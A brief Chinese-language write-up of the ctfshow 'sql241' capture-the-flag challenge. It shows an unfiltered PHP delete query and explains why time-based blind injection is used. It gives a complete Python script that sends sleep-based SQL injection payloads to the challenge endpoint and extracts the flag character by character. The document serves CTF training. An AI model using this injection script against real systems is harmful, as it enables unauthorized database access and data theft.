# ctfshow-sql241



##### 参考链接

其他大佬链接

feng  https://blog.csdn.net/rfrder/article/details/113759746

Je3    https://blog.csdn.net/jvkyvly/article/details/115458909

Y4	 https://blog.csdn.net/solitudi/article/details/110144623





 查询语句 

```
  //删除记录
  $sql = "delete from  ctfshow_user where id = {$id}";
```



 返回逻辑 

```
  //无过滤



```





```mysql
不能布尔盲注（因为搞一次，少一个），可以时间盲注
一共21条数据


响应时间是条数乘上sleep的时间即可



import requests
import time


url="http://0ee36b5a-705c-4700-b247-ae16023740b2.challenge.ctf.show:8080/api/delete.php"
flag=''
for i in range(1,100):
    low=32
    high=128
    mid=(low+high)//2
    while low<high:
        payload="if(ascii(substr((select group_concat(flag) from flag),{},1))>{},sleep(0.05),0)".format(i,mid)
        
        data={
            "id":payload,
            
        }
        time1=time.time()
        r=requests.post(url,data=data)
        time2=time.time()
        
        print(time2-time1)
        print(low,mid,high)
        time.sleep(0.05)

        if time2-time1>0.5:
            low=mid+1
        else:
            high=mid
        mid=(low+high)//2
    flag+=chr(mid)
    print(flag)
    if mid==32:
        print(flag)  
        break




```























